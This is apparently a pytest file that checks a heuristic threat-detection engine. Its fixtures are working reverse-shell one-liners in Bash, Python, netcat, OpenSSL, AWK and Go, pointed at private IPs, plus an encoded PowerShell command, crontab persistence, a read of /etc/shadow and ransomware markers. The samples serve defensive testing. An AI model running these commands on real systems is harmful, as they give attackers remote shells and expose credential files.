"""Regression tests for the heuristic threat engine."""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.llm_analyzer import _fallback_analysis


STRUCTURED_CASES = [
    (
        "OpenSSL reverse shell fixture",
        "test.txt",
        "modified",
        "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | "
        "openssl s_client -quiet -connect 192.168.1.253:9000 > /tmp/s; rm /tmp/s",
    ),
    (
        "Python reverse shell",
        "test.txt",
        "modified",
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect(('10.0.0.1',4444))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "subprocess.call(['/bin/sh','-i'])",
    ),
    ("Bash reverse shell", "notes.txt", "modified", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
    (
        "PowerShell encoded command",
        "update.txt",
        "new",
        "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    ),
    (
        "Normal text file",
        "readme.txt",
        "modified",
        "Hello, this is just a normal note file with nothing suspicious.",
    ),
    ("Netcat shell", "deploy.txt", "new", "nc -e /bin/sh 192.168.1.100 4444"),
    ("Crontab persistence", "backup.sh", "new", "crontab -e\n*/5 * * * * /tmp/.hidden_backdoor"),
    ("Password file access", "audit.log", "modified", "cat /etc/shadow > /tmp/hashes.txt"),
    (".exe file created", "updater.exe", "new", "MZ binary content here"),
    (
        "Ransomware indicators",
        "encrypt.py",
        "new",
        "from Crypto.Cipher import AES\n"
        "ransom_note = 'YOUR FILES HAVE BEEN ENCRYPTED'\n"
        "bitcoin_wallet = 'bc1q...'",
    ),
    (
        "Mkfifo + netcat combo",
        "payload.sh",
        "new",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f",
    ),
    (
        "Bash 196 reverse shell",
        "script.sh",
        "modified",
        "0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196",
    ),
    (
        "AWK reverse shell",
        "cron.txt",
        "new",
        "awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ "
        "printf \"shell> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) "
        "print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
    ),
    (
        "Golang reverse shell",
        "main.go",
        "new",
        "echo 'package main;import\"os/exec\";import\"net\";func main(){"
        "c,_:=net.Dial(\"tcp\",\"10.0.0.1:4444\");cmd:=exec.Command(\"/bin/sh\");"
        "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go",
    ),
]


@pytest.mark.parametrize(("label", "path", "change", "content"), STRUCTURED_CASES)
def test_heuristic_returns_structured_output(label, path, change, content):
    result = _fallback_analysis(path, change, content)
    required_fields = {
        "risk_score",
        "priority",
        "is_malicious",
        "reasoning",
        "threat_type",
        "threat_classification",
        "mitre_attack",
        "iocs",
        "confidence",
        "analysis_source",
        "findings",
    }

    assert required_fields.issubset(result), label


def test_openssl_reverse_shell_is_critical():
    result = _fallback_analysis(
        "test.txt",
        "modified",
        "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | "
        "openssl s_client -quiet -connect 192.168.1.253:9000 > /tmp/s; rm /tmp/s",
    )

    assert result["risk_score"] >= 9
    assert result["priority"] == "critical"
    assert result["is_malicious"] is True
    assert result["threat_type"] == "reverse_shell"
    assert "T1059.004" in result["mitre_attack"]
    assert "192.168.1.253:9000" in result["iocs"] or "192.168.1.253" in result["iocs"]
    assert result["analysis_source"] == "heuristic"


def test_normal_text_is_benign():
    result = _fallback_analysis(
        "readme.txt",
        "modified",
        "Hello, this is just a normal note file with nothing suspicious.",
    )

    assert result["risk_score"] <= 3
    assert result["is_malicious"] is False


def test_python_reverse_shell_is_critical():
    result = _fallback_analysis(
        "test.py",
        "modified",
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect(('10.0.0.1',4444))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "subprocess.call(['/bin/sh','-i'])",
    )

    assert result["risk_score"] >= 8
    assert result["is_malicious"] is True
    assert result["threat_type"] == "reverse_shell"
    assert result["mitre_attack"]


def test_ransomware_indicators_are_detected():
    result = _fallback_analysis(
        "encrypt.py",
        "new",
        "from Crypto.Cipher import AES\n"
        "ransom_note = 'YOUR FILES HAVE BEEN ENCRYPTED'\n"
        "bitcoin_wallet = 'bc1q...'",
    )

    assert result["risk_score"] >= 8
    assert result["threat_type"] == "ransomware"
